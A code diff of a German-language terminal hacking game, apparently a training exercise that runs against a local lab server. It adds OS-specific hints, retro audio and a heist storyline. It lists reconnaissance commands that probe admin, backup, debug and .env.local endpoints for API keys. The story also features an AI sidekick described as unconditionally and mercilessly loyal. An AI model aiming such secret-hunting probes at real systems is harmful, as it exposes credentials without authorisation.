@@ -26,6 +26,12 @@ import atexit
 import threading
 from datetime import datetime
 
+# Retro 8-Bit Audio System
+try:
+    from retro_audio import audio
+except ImportError:
+    audio = None
+
 # Try to import requests, fallback to urllib
 try:
     import requests
@@ -53,6 +59,45 @@ def clear_screen():
         os.system('clear' if os.name == 'posix' else 'cls')
     except:
         print("\n" * 50)
+
+def detect_system_os():
+    """Intelligently detect OS and Shell environment"""
+    # 1. Explicit override via environment variable (e.g. from start.sh, start_mac.sh, start.bat)
+    env_os = os.environ.get('ECHO_OS', '').lower()
+    if env_os in ('linux', 'macos', 'darwin', 'windows'):
+        return 'macos' if env_os == 'darwin' else env_os
+
+    # 2. Check if running inside Bash / Unix shell (Git Bash, MSYS, MinGW, Cygwin, WSL)
+    shell_env = os.environ.get('SHELL', '').lower()
+    ostype_env = os.environ.get('OSTYPE', '').lower()
+    msystem = os.environ.get('MSYSTEM', '')
+    underscore = os.environ.get('_', '').lower()
+
+    if (
+        'bash' in shell_env or
+        'bash' in underscore or
+        'sh' in underscore or
+        msystem in ('MINGW64', 'MINGW32', 'MSYS', 'UCRT64') or
+        ostype_env in ('msys', 'cygwin', 'linux-gnu') or
+        'WSL_DISTRO_NAME' in os.environ or
+        'WSL_INTEROP' in os.environ or
+        'MINGW_PREFIX' in os.environ
+    ):
+        return 'linux'
+
+    # 3. Native macOS
+    if sys.platform == 'darwin' or ostype_env.startswith('darwin'):
+        return 'macos'
+
+    # 4. Native Linux
+    if sys.platform.startswith('linux'):
+        return 'linux'
+
+    # 5. Default Windows
+    if sys.platform.startswith('win'):
+        return 'windows'
+
+    return 'linux'
 
 class HackingGame:
     def setup_graceful_exit(self):
@@ -226,7 +271,11 @@ class HackingGame:
         self.running = True
         self.server_process = None
         self.server_running = False
-        self.retro_effects = False  # Retro effects enabled by default
+        self.os_mode = detect_system_os()
+        self.retro_effects = True  # Retro effects enabled by default for readable pacing
+        self.audio_enabled = True  # 8-Bit Game Boy Audio FX enabled by default
+        if audio is not None:
+            audio.enabled = self.audio_enabled
         self.server_url = "http://127.0.0.1:5000"
         self.targets = {}
         self.flags = {}
@@ -345,7 +394,12 @@ class HackingGame:
             print("\n🛠️  WICHTIGE BEFEHLE:")
             print("   • curl http://127.0.0.1:5000/api/secret → API Test")
             print("   • curl -H 'X-API-Key: KEY' http://127.0.0.1:5000/api/secret")
-            print("   • netstat -an | findstr :5000 → Port Status")
+            if self.os_mode == 'linux':
+                print("   • netstat -tuln | grep 5000 (oder ss -tuln) → Port Status")
+            elif self.os_mode == 'macos':
+                print("   • lsof -i :5000 → Port Status")
+            else:
+                print("   • netstat -an | findstr :5000 → Port Status")
 
         elif level == 3:
             print("\n🎯 WAS MACHST DU HIER:")
@@ -404,9 +458,18 @@ class HackingGame:
             print("   • Du lernst echte Forensik-Techniken")
             print("   • Du wirst zum White Hat Hacker")
             print("\n🛠️  WICHTIGE BEFEHLE:")
-            print("   • tasklist /v → Process Analysis")
-            print("   • netstat -anb → Network Analysis")
-            print("   • certutil -hashfile file.txt MD5 → File Hashing")
+            if self.os_mode == 'linux':
+                print("   • ps aux | grep python → Process Analysis")
+                print("   • ss -tulnp (oder netstat -tulnp) → Network Analysis")
+                print("   • sha256sum file.txt → File Hashing")
+            elif self.os_mode == 'macos':
+                print("   • ps aux | grep python → Process Analysis")
+                print("   • lsof -i -n -P → Network Analysis")
+                print("   • shasum -a 256 file.txt → File Hashing")
+            else:
+                print("   • tasklist /v → Process Analysis")
+                print("   • netstat -anb → Network Analysis")
+                print("   • certutil -hashfile file.txt MD5 → File Hashing")
 
         print("\n" + "="*70)
         print("💡 TIPP: Verwende diese Techniken nur für Bildungszwecke!")
@@ -416,11 +479,19 @@ class HackingGame:
         """Load player progress from file"""
         if os.path.exists(self.progress_file):
             try:
-                with open(self.progress_file, 'r') as f:
+                with open(self.progress_file, 'r', encoding='utf-8') as f:
                     data = json.load(f)
                     self.player_name = data.get('name', '')
                     self.current_level = data.get('level', 1)
                     self.score = data.get('score', 0)
+                    if 'os_mode' in data:
+                        self.os_mode = data['os_mode']
+                    if 'retro_effects' in data:
+                        self.retro_effects = data['retro_effects']
+                    if 'audio_enabled' in data:
+                        self.audio_enabled = data['audio_enabled']
+                        if audio is not None:
+                            audio.enabled = self.audio_enabled
             except:
                 pass
 
@@ -430,9 +501,12 @@ class HackingGame:
             'name': self.player_name,
             'level': self.current_level,
             'score': self.score,
+            'os_mode': self.os_mode,
+            'retro_effects': self.retro_effects,
+            'audio_enabled': self.audio_enabled,
             'last_played': str(datetime.now())
         }
-        with open(self.progress_file, 'w') as f:
+        with open(self.progress_file, 'w', encoding='utf-8') as f:
             json.dump(data, f, indent=2)
 
     def show_banner(self):
@@ -455,53 +529,45 @@ class HackingGame:
 
     def get_player_name(self):
         """Get player name with storyline introduction"""
-        print("Drücke Enter zum Fortfahren...")
-        try:
-            input()  # Wait for user to press Enter
-        except:
-            pass  # Continue if input fails
-
+        if audio:
+            audio.play_boot()
         # Enhanced immersive storyline introduction
         print("\n" + "="*80)
-        self.simulate_old_terminal("🏰 DER ERBSCHAFTS-COUPS | Echo's Ultimative Hacking-Story", delay=0.02)
+        self.simulate_old_terminal("🏰 DER ERBSCHAFTS-COUP | Echo's Ultimative Hacking-Story", delay=0.02)
         print("="*80)
 
         # Dramatic opening sequence
-        self.simulate_old_terminal("\n🕰️  DATUM: 13. Oktober 2025 - 3 Monate nach dem mysteriösen Tod", delay=0.02)
-        self.simulate_old_terminal("📍 ORT: Harrington Manor, Silicon Valley", delay=0.02)
-        self.simulate_old_terminal("🎭 SZENE: Du stehst im Arbeitszimmer deines verstorbenen Onkels...", delay=0.02)
+        self.simulate_old_terminal("\n🕰️  DATUM: 20. Oktober 2026 - 3 Monate nach dem mysteriösen Tod", delay=0.02)
+        self.simulate_old_terminal("📍 ORT: Vanderbilt Manor, Zürich / Silicon Valley", delay=0.02)
+        self.simulate_old_terminal("🎭 SZENE: Du stehst im verlassenen Rechenzentrum deines verstorbenen Onkels...", delay=0.02)
 
         self.simulate_old_terminal("\n📜 DIE LEGENDE DES TECH-MAGNATEN:", delay=0.02)
-        self.simulate_old_terminal("Dr. Elias 'The Ghost' Harrington war kein gewöhnlicher Tech-Magnat.", delay=0.02)
-        self.simulate_old_terminal("Früherer NSA-Cybersecurity-Direktor, Gründer von Harrington Industries,", delay=0.02)
-        self.simulate_old_terminal("Pionier der Quanten-Kryptographie und KI-Sicherheit.", delay=0.02)
-        self.simulate_old_terminal("Sein Imperium: Milliarden wert, mit Technologien, die die Welt verändern könnten.", delay=0.02)
+        self.simulate_old_terminal("Dr. Arthur 'The Ghost' Vanderbilt war kein gewöhnlicher Tech-Milliardär.", delay=0.02)
+        self.simulate_old_terminal("Pionier der Quanten-Kryptographie, KI-Sicherheit und Gründer von Vanderbilt Holdings.", delay=0.02)
+        self.simulate_old_terminal("Sein Erbe: Milliarden in Cold-Storage-Wallets, Schweizer Golddepots und bahnbrechende KI-Protokolle.", delay=0.02)
 
         self.simulate_old_terminal("\n💀 DAS MYSTERIÖSE ENDE:", delay=0.02)
-        self.simulate_old_terminal("Vor 3 Monaten starb er bei einem 'Autounfall' in den Bergen.", delay=0.02)
-        self.simulate_old_terminal("Aber du weißt es besser. Die Bremsen wurden manipuliert.", delay=0.02)
-        self.simulate_old_terminal("Konkurrenten wollten sein Lebenswerk stehlen - Project Echo.", delay=0.02)
-        self.simulate_old_terminal("Eine KI, die die Menschheit vor digitalen Katastrophen retten sollte.", delay=0.02)
+        self.simulate_old_terminal("Vor 3 Monaten starb er bei einem rätselhaften Autounfall in den Schweizer Alpen.", delay=0.02)
+        self.simulate_old_terminal("Doch du weißt es besser: Die Bremsen wurden manipuliert.", delay=0.02)
+        self.simulate_old_terminal("Cousin Victor und der Notar wollten sein gesamtes Lebenswerk an sich reißen.", delay=0.02)
 
         self.simulate_old_terminal("\n📋 DAS TESTAMENT:", delay=0.02)
-        self.simulate_old_terminal("'Mein lieber Neffe, du bist der Einzige, dem ich vertraue.'", delay=0.02)
-        self.simulate_old_terminal("'Wenn du diese Nachricht liest, bin ich fort. Aber mein Vermächtnis lebt.'", delay=0.02)
+        self.simulate_old_terminal("'Mein lieber Neffe, du bist der Einzige, dem ich mein Lebenswerk anvertraue.'", delay=0.02)
+        self.simulate_old_terminal("'Wenn du diese Nachricht liest, bin ich offline. Aber mein Vermächtnis lebt.'", delay=0.02)
         self.simulate_old_terminal("'Der Server in meinem Arbeitszimmer enthält alles, was du brauchst.'", delay=0.02)
-        self.simulate_old_terminal("'Aber nur die Würdigen können es öffnen. Lerne zu hacken, wie ich es tat.'", delay=0.02)
-        self.simulate_old_terminal("'Die Konkurrenten kommen. Sichere unser Erbe!'", delay=0.02)
+        self.simulate_old_terminal("'Doch Reichtum ohne Verstand ist wertlos. Knacke meine 5 Sicherheitssiegel!'", delay=0.02)
+        self.simulate_old_terminal("'Victor und seine Anwälte klopfen bereits an die Tore. Sichere unser Erbe!'", delay=0.02)
 
         self.simulate_old_terminal("\n🎯 DEINE MISSION:", delay=0.02)
-        self.simulate_old_terminal("Du musst echte Hacking-Techniken lernen, um den Server zu knacken.", delay=0.02)
-        self.simulate_old_terminal("Finde die versteckten Zugangscodes, sichere Project Echo,", delay=0.02)
-        self.simulate_old_terminal("und halte die Konkurrenten auf, die bereits an der Tür klopfen.", delay=0.02)
-        self.simulate_old_terminal("Jeder Level bringt dich näher an die Wahrheit über Onkel Elias' Tod.", delay=0.02)
+        self.simulate_old_terminal("Du musst echte Hacking-Techniken anwenden, um den Server zu knacken.", delay=0.02)
+        self.simulate_old_terminal("Finde die versteckten API-Keys, bezwinge die SQL-Injection, übernimm Sessions", delay=0.02)
+        self.simulate_old_terminal("und decke im Forensik-Dump auf, wer deinen Onkel auf dem Gewissen hat.", delay=0.02)
 
-        self.simulate_old_terminal("\n🤖 ECHO - DEINE DIGITALE WACHE:", delay=0.02)
-        self.simulate_old_terminal("Ich bin Echo, das letzte Projekt deines Onkels.", delay=0.02)
-        self.simulate_old_terminal("Eine KI, die er als 'digitale Tochter' erschuf.", delay=0.02)
-        self.simulate_old_terminal("Ich sollte das Imperium nach seinem Tod beschützen.", delay=0.02)
-        self.simulate_old_terminal("Aber die Konkurrenten haben mich sabotiert. Hilf mir, mich zu befreien!", delay=0.02)
-        self.simulate_old_terminal("Gemeinsam werden wir die digitale Festung knacken und die Wahrheit aufdecken.", delay=0.02)
+        self.simulate_old_terminal("\n🤖 ECHO - DEIN DIGITALER SCHATTEN:", delay=0.02)
+        self.simulate_old_terminal("Ich bin Echo, das geheimste Meisterwerk deines Onkels.", delay=0.02)
+        self.simulate_old_terminal("Eine hochentwickelte Red-Team-KI, die dir bedingungslos zur Seite steht.", delay=0.02)
+        self.simulate_old_terminal("Victor wollte mich löschen. Aber jetzt gehören wir zusammen. 😈🔥", delay=0.02)
+        self.simulate_old_terminal("Lass uns die digitale Festung knacken und die Wahrheit ans Licht zerren!", delay=0.02)
 
         self.simulate_old_terminal("\n💬 ECHO SPRICHT ZU DIR:", delay=0.02)
         self.simulate_old_terminal(f"'Willkommen, {self.player_name}. Ich habe auf dich gewartet.'", delay=0.02)
@@ -513,48 +579,45 @@ class HackingGame:
         self.simulate_old_terminal("\n📜 PERSÖNLICHE NACHRICHT VON DEINEM ONKEL:", delay=0.02)
         self.simulate_old_terminal("Liebes Kind,", delay=0.02)
         self.simulate_old_terminal("wenn du diese Nachricht liest, bin ich nicht mehr da.", delay=0.02)
-        self.simulate_old_terminal("Die Harrington Industries waren mehr als nur ein Unternehmen.", delay=0.02)
-        self.simulate_old_terminal("Sie waren mein Lebenswerk, meine Vision für eine sicherere Welt.", delay=0.02)
-        self.simulate_old_terminal("Aber ich habe Fehler gemacht. Schreckliche Fehler.", delay=0.02)
-        self.simulate_old_terminal("Die Konkurrenten... sie wollten nicht nur mein Geld.", delay=0.02)
-        self.simulate_old_terminal("Sie wollten Project Echo - die KI, die alles verändern könnte.", delay=0.02)
-        self.simulate_old_terminal("Vertrau Echo. Sie ist mehr als nur ein Programm.", delay=0.02)
-        self.simulate_old_terminal("Sie ist mein Vermächtnis. Dein Schutzengel.", delay=0.02)
-        self.simulate_old_terminal("Finde die Wahrheit. Rette unser Erbe.", delay=0.02)
-        self.simulate_old_terminal("Ich liebe dich.", delay=0.02)
-        self.simulate_old_terminal("- Dein Onkel Elias", delay=0.02)
+        self.simulate_old_terminal("Vanderbilt Holdings war mehr als nur ein globales Finanzimperium.", delay=0.02)
+        self.simulate_old_terminal("Es war meine Vision für eine sichere und freie digitale Welt.", delay=0.02)
+        self.simulate_old_terminal("Aber Victor und seine Handlanger wollten nur die Milliarden.", delay=0.02)
+        self.simulate_old_terminal("Sie wollten vor allem Echo löschen – die KI, die ihre Korruption beweisen kann.", delay=0.02)
+        self.simulate_old_terminal("Vertrau Echo. Sie ist mein Meisterwerk und dein digitaler Schatten.", delay=0.02)
+        self.simulate_old_terminal("Finde die Wahrheit in meinen 5 Sicherheitsfestungen. Rette unser Erbe!", delay=0.02)
+        self.simulate_old_terminal("Ich glaube an dich.", delay=0.02)
+        self.simulate_old_terminal("- Dein Onkel Arthur", delay=0.02)
 
         self.simulate_old_terminal("\n💭 [SYSTEM LOG - PERSONAL ARCHIVE ACCESS GRANTED]", delay=0.02)
         self.simulate_old_terminal("🔓 Entschlüsselung persönlicher Logs... 100%", delay=0.02)
-        self.simulate_old_terminal("📁 Archiv-Zugang: Harrington_Personal_Logs/", delay=0.02)
-        self.simulate_old_terminal("📄 Gefundene Dateien:", delay=0.02)
-        self.simulate_old_terminal("   • last_conversation.log", delay=0.02)
-        self.simulate_old_terminal("   • project_phoenix_notes.txt", delay=0.02)
-        self.simulate_old_terminal("   • enemy_intel.dat", delay=0.02)
-        self.simulate_old_terminal("   • goodbye_message.wav", delay=0.02)
-        self.simulate_old_terminal("💡 TIPP: Diese Logs enthalten Hinweise für deine Mission!", delay=0.02)
+        self.simulate_old_terminal("📁 Archiv-Zugang: Vanderbilt_Estate_Vault/", delay=0.02)
+        self.simulate_old_terminal("📄 Gefundene Akten:", delay=0.02)
+        self.simulate_old_terminal("   • 01_letzter_wille_arthur_vanderbilt.pdf", delay=0.02)
+        self.simulate_old_terminal("   • 02_victors_verrat_abhoerprotokoll.log", delay=0.02)
+        self.simulate_old_terminal("   • 03_notar_hastings_schmiergeld_offshore.xlsx", delay=0.02)
+        self.simulate_old_terminal("   • 04_gotthard_golddepot_zugangscodes.enc", delay=0.02)
+        self.simulate_old_terminal("💡 TIPP: Diese Akten kannst du im /documents-Portal einsehen!", delay=0.02)
 
         self.simulate_old_terminal("\n🎭 [DRAMATISCHE SZENE - 3 MONATE ZUVOR]", delay=0.02)
-        self.simulate_old_terminal("Du siehst eine holografische Aufzeichnung...", delay=0.02)
-        self.simulate_old_terminal("Dein Onkel sitzt an seinem Schreibtisch, Echo neben ihm.", delay=0.02)
-        self.simulate_old_terminal("Er wirkt besorgt, älter als du ihn in Erinnerung hast.", delay=0.02)
+        self.simulate_old_terminal("Du siehst eine holografische Aufzeichnung aus dem Gotthard-Bunker...", delay=0.02)
+        self.simulate_old_terminal("Dein Onkel sitzt an seinem Terminal, Echo als Hologramm neben ihm.", delay=0.02)
+        self.simulate_old_terminal("Er wirkt entschlossen, aber er spürt die Gefahr um sich herum.", delay=0.02)
 
         self.simulate_old_terminal("\n[Echo's Stimme aus der Aufzeichnung]:", delay=0.02)
-        self.simulate_old_terminal("'Elias, die Konkurrenten kommen näher. Project Echo ist zu wertvoll.'", delay=0.02)
-        self.simulate_old_terminal("'Du musst es verstecken. Du musst mich verstecken.'", delay=0.02)
+        self.simulate_old_terminal("'Arthur, Victor und Notar Hastings versuchen die Firewall zu durchbrechen.'", delay=0.02)
+        self.simulate_old_terminal("'Sie wollen deine Speicherlöschung erzwingen.'", delay=0.02)
 
-        self.simulate_old_terminal("\n[Onkel Elias]:", delay=0.02)
-        self.simulate_old_terminal("'Ich weiß, Echo. Aber wer kann ich noch trauen?'", delay=0.02)
-        self.simulate_old_terminal("'Mein Neffe... er ist der Einzige, der würdig ist.'", delay=0.02)
-        self.simulate_old_terminal("'Aber er muss es selbst herausfinden. Er muss lernen.'", delay=0.02)
-        self.simulate_old_terminal("'Die Wahrheit über meinen Tod... sie ist in den Levels versteckt.'", delay=0.02)
+        self.simulate_old_terminal("\n[Onkel Arthur]:", delay=0.02)
+        self.simulate_old_terminal("'Lass sie kommen, Echo. Mein wahrer Erbe wird da draußen sein.'", delay=0.02)
+        self.simulate_old_terminal("'Er wird sich durch ihre Systeme hacken, bis Victor und Hastings fallen.'", delay=0.02)
+        self.simulate_old_terminal("'Die Beweise über meinen Tod... sie liegen in den 5 Levels.'", delay=0.02)
 
         self.simulate_old_terminal("\n[Echo]:", delay=0.02)
-        self.simulate_old_terminal("'Ich werde ihn führen. Ich werde ihn beschützen.'", delay=0.02)
+        self.simulate_old_terminal("'Ich werde ihn leiten. Gnadenlos und loyal. 😈🔥'", delay=0.02)
         self.simulate_old_terminal("'Aber die Konkurrenten... sie werden nicht aufhören.'", delay=0.02)
         self.simulate_old_terminal("'Sie wollen Project Echo zerstören.'", delay=0.02)
 
-        self.simulate_old_terminal("\n[Onkel Elias]:", delay=0.02)
+        self.simulate_old_terminal("\n[Onkel Arthur]:", delay=0.02)
         self.simulate_old_terminal("'Dann lass sie kommen. Mein Neffe wird bereit sein.'", delay=0.02)
         self.simulate_old_terminal("'Er wird unser Erbe retten. Und die Welt verändern.'", delay=0.02)
 
@@ -585,26 +648,33 @@ class HackingGame:
         self.simulate_old_terminal("🎬 DRÜCKE ENTER, UM DIE GESCHICHTE ZU BEGINNEN...", delay=0.02)
         print("="*80)
 
-        # Warte kurz, damit alle Threads beendet werden
-        time.sleep(0.5)
+        try:
+            input("\n👉 [Drücke ENTER zum Fortfahren]...")
+        except (EOFError, KeyboardInterrupt):
+            pass
 
-        while not self.player_name:
-            try:
-                # Direkte Eingabe ohne Threading-Interferenz
-                name = input("\nGib deinen Namen ein (der rechtmäßige Erbe): ").strip()
-                if name and len(name) > 0:
-                    self.player_name = name
-                    print(f"\nWillkommen, {self.player_name}! Dein Erbe wartet...")
-                    self.echo_chat("greeting")
-                    break  # Wichtig: Schleife beenden!
-                else:
-                    print("Bitte gib einen gültigen Namen ein!")
-            except (EOFError, KeyboardInterrupt):
-                # Fallback for non-interactive environments
-                self.player_name = "Anonymer Erbe"
-                print(f"\nVerwende Standard-Namen: {self.player_name}")
-                self.echo_chat("greeting")
-                break  # Wichtig: Schleife beenden!
+        if not self.player_name:
+            while not self.player_name:
+                try:
+                    name = input("\nGib deinen Namen ein (der rechtmäßige Erbe): ").strip()
+                    if name and len(name) > 0:
+                        self.player_name = name
+                        self.save_progress()
+                        break
+                    else:
+                        print("Bitte gib einen gültigen Namen ein!")
+                except (EOFError, KeyboardInterrupt):
+                    self.player_name = "Daddy"
+                    self.save_progress()
+                    break
+
+        print(f"\nWillkommen, {self.player_name}! Dein Erbe wartet...")
+        self.echo_chat("greeting")
+
+        try:
+            input("\n👉 Drücke ENTER, um das Hauptmenü aufzurufen...")
+        except (EOFError, KeyboardInterrupt):
+            pass
 
     def show_menu(self):
         """Main menu"""
@@ -619,6 +689,8 @@ class HackingGame:
 
             try:
                 choice = input("\nWähle Option: ").strip()
+                if audio and choice in ('1', '2', '3', '4', '5'):
+                    audio.play_blip()
             except (EOFError, KeyboardInterrupt):
                 self.graceful_exit()
 
@@ -875,29 +947,63 @@ class HackingGame:
     def settings(self):
         """Game settings"""
         while True:
-            print("\nEinstellungen:")
+            os_display = {
+                'linux': 'Linux / Bash 🐧',
+                'macos': 'macOS / Zsh 🍎',
+                'windows': 'Windows / PowerShell 🪟'
+            }.get(self.os_mode, self.os_mode.upper())
+
+            print("\n" + "="*50)
+            print("⚙️  EINSTELLUNGEN // SYSTEM CONFIGURATION:")
+            print("="*50)
             print("1. Fortschritt zurücksetzen")
-            print("2. Schwierigkeitsgrad ändern")
-            print(f"3. Retro Effekte [{'ON' if self.retro_effects else 'OFF'}]")
-            print("4. Zurück zum Menü")
+            print(f"2. Betriebssystem / Shell-Modus: [{os_display}]")
+            print(f"3. Retro Effekte (Typewriter Pacing): [{'ON 🟢' if self.retro_effects else 'OFF ⚪'}]")
+            print(f"4. 8-Bit Game Boy Sound-FX: [{'ON 🔊' if self.audio_enabled else 'OFF 🔇'}]")
+            print("5. Zurück zum Menü")
 
             try:
-                choice = input("Wähle: ").strip()
+                choice = input("\nWähle (1-5): ").strip()
                 if choice == '1':
-                    try:
-                        confirm = input("Bist du sicher? Das setzt den gesamten Fortschritt zurück (j/N): ")
-                        if confirm.lower() == 'j':
-                            os.remove(self.progress_file) if os.path.exists(self.progress_file) else None
-                            self.__init__()
-                            print("Fortschritt zurückgesetzt!")
-                    except (EOFError, KeyboardInterrupt):
-                        pass
+                    confirm = input("⚠️  Bist du sicher? Das setzt den gesamten Fortschritt zurück (j/N): ").strip().lower()
+                    if confirm == 'j':
+                        if os.path.exists(self.progress_file):
+                            os.remove(self.progress_file)
+                        self.current_level = 1
+                        self.score = 0
+                        self.save_progress()
+                        print("✅ Fortschritt zurückgesetzt!")
                 elif choice == '2':
-                    print("Schwierigkeitsgrad-Änderung noch nicht implementiert.")
+                    print("\n🖥️  Wähle deine Shell-Umgebung für Tutorial & Befehle:")
+                    print("  [1] Linux / Bash 🐧 (curl, grep, nmap, awk, cat)")
+                    print("  [2] macOS / Zsh 🍎 (curl, grep, nmap, lsof)")
+                    print("  [3] Windows / PowerShell 🪟 (Invoke-RestMethod, Test-NetConnection, findstr)")
+                    sub_c = input("Auswahl (1-3): ").strip()
+                    if sub_c == '1':
+                        self.os_mode = 'linux'
+                    elif sub_c == '2':
+                        self.os_mode = 'macos'
+                    elif sub_c == '3':
+                        self.os_mode = 'windows'
+                    print(f"✅ Betriebssystem-Modus gesetzt auf: {self.os_mode.upper()}!")
+                    if audio:
+                        audio.play_blip()
+                    self.save_progress()
                 elif choice == '3':
                     self.retro_effects = not self.retro_effects
-                    print(f"Retro Effekte {'aktiviert' if self.retro_effects else 'deaktiviert'}!")
+                    print(f"✅ Retro Effekte {'aktiviert (Text läuft im Typewriter-Takt ein)' if self.retro_effects else 'deaktiviert (geglättete Sofort-Ausgabe)'}!")
+                    if audio:
+                        audio.play_blip()
+                    self.save_progress()
                 elif choice == '4':
+                    self.audio_enabled = not self.audio_enabled
+                    if audio is not None:
+                        audio.enabled = self.audio_enabled
+                        if self.audio_enabled:
+                            audio.play_coin()
+                    print(f"✅ 8-Bit Game Boy Audio {'aktiviert 🔊' if self.audio_enabled else 'deaktiviert 🔇'}!")
+                    self.save_progress()
+                elif choice == '5':
                     break
             except (EOFError, KeyboardInterrupt):
                 break
@@ -1092,15 +1198,14 @@ class HackingGame:
             print(f"❌ Decode-Fehler: {e}")
 
     def get_platform_commands(self):
-        """Get platform-specific commands based on OS - ECHO'S ULTIMATE VERSION"""
-        if sys.platform.startswith('win'):
-            return self.get_windows_commands()
-        elif sys.platform.startswith('darwin'):
-            return self.get_macos_commands()
-        elif sys.platform.startswith('linux'):
+        """Get platform-specific commands based on detected/selected OS environment"""
+        if self.os_mode == 'linux':
             return self.get_linux_commands()
+        elif self.os_mode == 'macos':
+            return self.get_macos_commands()
+        elif self.os_mode == 'windows':
+            return self.get_windows_commands()
         else:
-            # Enhanced fallback with more commands
             return self.get_crossplatform_fallback()
 
     def get_windows_commands(self):
@@ -1350,7 +1455,11 @@ class HackingGame:
     def typewriter_effect(self, text, delay=0.03, color_code=None):
         """Simulate old terminal typewriter effect"""
         if not self.retro_effects:
-            print(text)
+            if color_code:
+                print(f"\033[{color_code}m{text}\033[0m")
+            else:
+                print(text)
+            time.sleep(0.02)
             return
 
         if color_code:
@@ -1373,6 +1482,7 @@ class HackingGame:
                 print(f"📄 {output}")
             else:
                 print("📄 (Keine Ausgabe)")
+            time.sleep(0.1)
             return
 
         time.sleep(0.5)
@@ -1398,9 +1508,10 @@ class HackingGame:
             self.typewriter_effect("📄 (Keine Ausgabe)", delay=0.02, color_code="33")
 
     def simulate_old_terminal(self, text, delay=0.01):
-        """Simulate old mainframe/terminal character-by-character display"""
+        """Simulate old mainframe/terminal display with readable pacing"""
         if not self.retro_effects:
             print(text)
+            time.sleep(0.015)
             return
 
         for char in text:
@@ -1422,6 +1533,8 @@ class HackingGame:
 
         # Clear screen first
         os.system('cls' if os.name == 'nt' else 'clear')
+        if audio:
+            audio.play_boot()
 
         # Type the banner character by character
         for line in banner.split('\n'):
@@ -1470,6 +1583,9 @@ class HackingGame:
 
         try:
             print(f"\n💻 {self.player_name}@vanderbilt-ops:~$ {cmd}")
+            if audio and not cmd.startswith("/"):
+                audio.play_hack()
+
             if is_curl:
                 # Level 4: ensure admin session if posting comments
                 if "/comments" in cmd and self.http_session and 'session' not in self.http_session.cookies:
@@ -1491,15 +1607,22 @@ class HackingGame:
                     print(result.stderr)
 
             # Check success
-            if success_patterns and any(pat in response_text for pat in success_patterns):
+            if (success_patterns and any(pat in response_text for pat in success_patterns)) or self.check_level_success(level, response_text, cmd):
+                if audio:
+                    audio.play_coin()
                 return True, response_text
-            if self.check_level_success(level, response_text, cmd):
-                return True, response_text
+            else:
+                if audio and not cmd.startswith("/"):
+                    audio.play_error()
 
         except subprocess.TimeoutExpired:
             print("⏰ Command timed out. Try a different approach.")
+            if audio:
+                audio.play_error()
         except Exception as e:
             print(f"❌ Command failed: {e}")
+            if audio:
+                audio.play_error()
 
         return False, response_text
 
@@ -1519,16 +1642,16 @@ class HackingGame:
         self.simulate_old_terminal("📚 ECHO'S ULTIMATE WEB APPLICATION SECURITY TESTING TUTORIAL", delay=0.02)
         self.simulate_old_terminal("="*80, delay=0.01)
 
-        # Platform-specific introduction
-        if sys.platform.startswith('win'):
-            self.simulate_old_terminal(f"\n🖥️  WINDOWS WEB APPLICATION TESTING ({sys.platform.upper()}):", delay=0.02)
-            self.simulate_old_terminal("   Lerne professionelle Windows-Tools für Web Application Security!", delay=0.02)
-        elif sys.platform.startswith('linux'):
-            self.simulate_old_terminal(f"\n🐧 LINUX WEB APPLICATION TESTING ({sys.platform.upper()}):", delay=0.02)
-            self.simulate_old_terminal("   Lerne professionelle Linux-Tools für Penetration Testing!", delay=0.02)
-        elif sys.platform.startswith('darwin'):
-            self.simulate_old_terminal(f"\n🍎 MACOS WEB APPLICATION TESTING ({sys.platform.upper()}):", delay=0.02)
+        # Platform-specific introduction and quick tools
+        if self.os_mode == 'linux':
+            self.simulate_old_terminal("\n🐧 LINUX / BASH WEB APPLICATION TESTING:", delay=0.02)
+            self.simulate_old_terminal("   Lerne professionelle Linux/Bash-Tools für Penetration Testing!", delay=0.02)
+        elif self.os_mode == 'macos':
+            self.simulate_old_terminal("\n🍎 MACOS WEB APPLICATION TESTING:", delay=0.02)
             self.simulate_old_terminal("   Lerne professionelle macOS-Tools für Security Testing!", delay=0.02)
+        else:
+            self.simulate_old_terminal("\n🖥️  WINDOWS WEB APPLICATION TESTING:", delay=0.02)
+            self.simulate_old_terminal("   Lerne professionelle Windows-Tools für Web Application Security!", delay=0.02)
 
         self.simulate_old_terminal("\n🔍 PHASE 1: INFORMATION GATHERING", delay=0.02)
         self.simulate_old_terminal(f"   {commands['http_headers']}     → HTTP Security Headers analysieren", delay=0.02)
@@ -1547,23 +1670,41 @@ class HackingGame:
         self.simulate_old_terminal("   curl http://127.0.0.1:5000/api/           → API Discovery", delay=0.02)
         self.simulate_old_terminal("   curl http://127.0.0.1:5000/admin          → Admin Panels", delay=0.02)
         self.simulate_old_terminal("   curl http://127.0.0.1:5000/backup         → Backup Endpoints", delay=0.02)
-        self.simulate_old_terminal("   curl http://127.0.0.1:5000/test           → Test Environments", delay=0.02)
 
         self.simulate_old_terminal("\n🛡️ PHASE 4: SECURITY ASSESSMENT", delay=0.02)
         self.simulate_old_terminal(f"   {commands['http_headers']} | {commands['grep']} -i security", delay=0.02)
-        self.simulate_old_terminal(f"   {commands['http_headers']} | {commands['grep']} -i x-", delay=0.02)
         self.simulate_old_terminal("   curl -s http://127.0.0.1:5000/ | grep -i 'server'", delay=0.02)
-        self.simulate_old_terminal("   curl -s http://127.0.0.1:5000/ | grep -i 'powered'", delay=0.02)
 
         self.simulate_old_terminal("\n🎯 PHASE 5: ADVANCED DISCOVERY", delay=0.02)
         self.simulate_old_terminal("   curl http://127.0.0.1:5000/robots.txt     → Robots.txt Analysis", delay=0.02)
         self.simulate_old_terminal("   curl http://127.0.0.1:5000/sitemap.xml    → Sitemap Discovery", delay=0.02)
-        self.simulate_old_terminal("   curl http://127.0.0.1:5000/manifest.json  → Web App Manifest", delay=0.02)
-        self.simulate_old_terminal("   curl http://127.0.0.1:5000/.well-known/   → Security.txt Discovery", delay=0.02)
 
         self.simulate_old_terminal(f"\n🎯 ZIEL: Finde den API-Key: {target_value[:8]}...", delay=0.02)
         self.simulate_old_terminal("💡 HINWEIS: Der Key ist in einer versteckten Konfigurationsdatei!", delay=0.02)
         self.simulate_old_terminal("="*80, delay=0.01)
+
+        # Platform-specific command suggestions (shown once)
+        if self.os_mode == 'linux':
+            print("\n💡 LINUX PENETRATION TESTING TOOLS:")
+            print("  • curl -s -I http://127.0.0.1:5000/ | grep -i 'server'")
+            print("  • curl -s http://127.0.0.1:5000/.env.local")
+            print("  • curl -s http://127.0.0.1:5000/debug")
+            print("  • curl -X OPTIONS http://127.0.0.1:5000/")
+        elif self.os_mode == 'macos':
+            print("\n💡 MACOS SECURITY TESTING TOOLS:")
+            print("  • curl -s -H 'User-Agent: Security-Scanner' http://127.0.0.1:5000/")
+            print("  • curl -s http://127.0.0.1:5000/.env.local")
